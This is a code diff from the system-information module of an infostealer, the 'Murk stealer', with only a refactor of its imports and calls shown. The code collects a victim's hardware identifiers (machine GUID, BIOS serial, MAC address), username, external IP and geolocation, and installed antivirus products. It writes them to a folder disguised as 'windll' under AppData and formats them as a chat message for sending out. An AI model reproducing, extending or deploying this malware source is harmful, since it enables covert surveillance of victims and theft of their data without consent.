@@ -10,18 +10,19 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-import psutil
-import GPUtil
-import socket
-import platform
-import os
-import time
-import requests
+from psutil import virtual_memory,disk_partitions,disk_usage,cpu_count,cpu_freq
+from GPUtil import getGPUs
+from socket import gethostbyname, gethostname
+from platform import uname,processor
+from os import getlogin, makedirs, sep, environ
+from os.path import exists
+from time import asctime
+from requests import get
 from subprocess import check_output, PIPE,run
-import wmi
-import winreg
-import json
-import uuid
+from wmi import WMI
+from winreg import OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx
+from json import loads
+from uuid import UUID,getnode
 from manager.logger import Log
 
 logo = '''
@@ -40,8 +41,8 @@ logo = '''
 
 def get_machine_guid():
     try:
-        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
-        value, _ = winreg.QueryValueEx(registry_key, "MachineGuid")
+        registry_key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
+        value, _ = QueryValueEx(registry_key, "MachineGuid")
         return value.strip()
     except Exception as e:
         Log(f"get_machine_guid ---> {e}")
@@ -49,7 +50,7 @@ def get_machine_guid():
 
 def get_bios_serial_number():
     try:
-        c = wmi.WMI()
+        c = WMI()
         bios = c.Win32_BIOS()[0]
         return bios.SerialNumber.strip()
     except Exception as e:
@@ -58,7 +59,7 @@ def get_bios_serial_number():
 
 def get_baseboard_manufacturer():
     try:
-        c = wmi.WMI()
+        c = WMI()
         baseboard = c.Win32_BaseBoard()[0]
         return baseboard.Manufacturer.strip()
     except Exception as e:
@@ -67,7 +68,7 @@ def get_baseboard_manufacturer():
 
 def get_mac_address():
     try:
-        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
+        mac = UUID(int=getnode()).hex[-12:]
         return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
     except Exception as e:
         Log(f"get_mac_address ---> {e}")
@@ -85,10 +86,10 @@ def get_size(bytes, suffix="B"):
 def SystemInfo():
     Log("===========System===========")
 
-    uname = platform.uname()
-    svmem = psutil.virtual_memory()
+    user = uname()
+    svmem = virtual_memory()
 
-    drives = psutil.disk_partitions()
+    drives = disk_partitions()
     drives_info = ''
     for drive in drives:
         drives_info += f"""
@@ -97,7 +98,7 @@ Name of drive: {drive.mountpoint}
 Type of file system: {drive.fstype}
 """
         if drive.opts != 'cdrom':
-            mount = psutil.disk_usage(drive.mountpoint)
+            mount = disk_usage(drive.mountpoint)
             drives_info += f"""Drive space: {get_size(mount.total)}
 drive space available: {get_size(mount.free)}
 drive space used: {get_size(mount.used)}
@@ -113,7 +114,7 @@ drive space used: {get_size(mount.used)}
 
 
     try:
-        gpus = GPUtil.getGPUs()
+        gpus = getGPUs()
         list_gpus = []
         for gpu in gpus:
             gpu_name = gpu.name
@@ -145,14 +146,14 @@ drive space used: {get_size(mount.used)}
         }
 
 
-    Antiviruses = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
+    Antiviruses = [Antiviruses[d] for d in filter(exists, Antiviruses)]
 
 
     ip_info = ""
-    internal_ip = socket.gethostbyname(socket.gethostname())
+    internal_ip = gethostbyname(gethostname())
     
     try:
-        ip_data = json.loads(requests.get('https://ipinfo.io/json').text)
+        ip_data = loads(get('https://ipinfo.io/json').text)
         external_ip = ip_data['ip']
         if 'city' in ip_data:
             city = f"🏙City: <code>{ip_data['city']}</code>\n"
@@ -198,20 +199,20 @@ Internal IP: {internal_ip}
     try:
         cpu = run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
     except:
-        cpu = platform.processor()
+        cpu = processor()
 
     systeminfo = f"""
 {logo}
 
 =====================MAIN=====================
-Time: {time.asctime()}
+Time: {asctime()}
 {timezone}{city}{region}{country}
-Username: {os.getlogin()}
-PC Name: {uname.node}
-Operation System: {uname.system}
-OS Release: {uname.release}
-OS Version: {uname.version}
-Architecture: {uname.machine}
+Username: {getlogin()}
+PC Name: {user.node}
+Operation System: {user.system}
+OS Release: {user.release}
+OS Version: {user.version}
+Architecture: {user.machine}
 HWID: {hwid}
 MAC Address: {get_mac_address()} 
 {info}
@@ -221,8 +222,8 @@ MAC Address: {get_mac_address()}
 {ip_info}
 =====================CPU======================
 CPU: {cpu}
-Count of cores of CPU: {psutil.cpu_count(logical=True)}
-CPU frequency: {psutil.cpu_freq()} MHz
+Count of cores of CPU: {cpu_count(logical=True)}
+CPU frequency: {cpu_freq()} MHz
 
 
 =====================GPU======================
@@ -240,9 +241,9 @@ RAM Used: {get_size(svmem.used)}
 ====================OTHER=====================
 Antiviruses: {', '.join(Antiviruses)}
 """
-    pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+    pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
     try:
-        os.makedirs(rf'{pathtofolder}\windll\System')
+        makedirs(rf'{pathtofolder}\windll\System')
         file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8')
         file.write(systeminfo)
     except Exception as e:
@@ -250,10 +251,10 @@ Antiviruses: {', '.join(Antiviruses)}
     
     msgdata=f"""
 <b>🖥System🖥</b>
-⏲Time: <code>{time.asctime()}</code>
-{timezone}{city}{country}👤Username: <code>{os.getlogin()}</code>
-👤PC Name: <code>{uname.node}</code>
-🖥OS: <code>{uname.system} {uname.release}</code>
+⏲Time: <code>{asctime()}</code>
+{timezone}{city}{country}👤Username: <code>{getlogin()}</code>
+👤PC Name: <code>{user.node}</code>
+🖥OS: <code>{user.system} {user.release}</code>
 📋HWID: <code>{hwid}</code>
 📋MAC Address: <code>{get_mac_address()}</code> 
 
